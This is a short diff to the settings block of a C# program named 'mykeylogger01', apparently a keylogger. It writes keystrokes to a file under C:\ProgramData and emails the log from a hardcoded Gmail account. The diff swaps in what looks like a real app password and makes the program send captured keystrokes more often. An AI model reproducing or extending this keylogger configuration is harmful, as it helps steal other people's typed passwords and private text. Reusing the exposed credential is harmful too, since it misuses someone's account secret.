@@ -12,12 +12,12 @@ namespace mykeylogger01
     {
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
         private const string FROM_EMAIL_ADDRESS = "testervm404@gmail.com";
-        private const string FROM_EMAIL_PASSWORD = "123456789Abc";
+        private const string FROM_EMAIL_PASSWORD = "jncrakczzcoycepu";
         private const string TO_EMAIL_ADDRESS = "testervm404@gmail.com";
         private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = false;
-        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
+        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 100;
         private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
         // ----------------------------- END -------------------------------- //
 
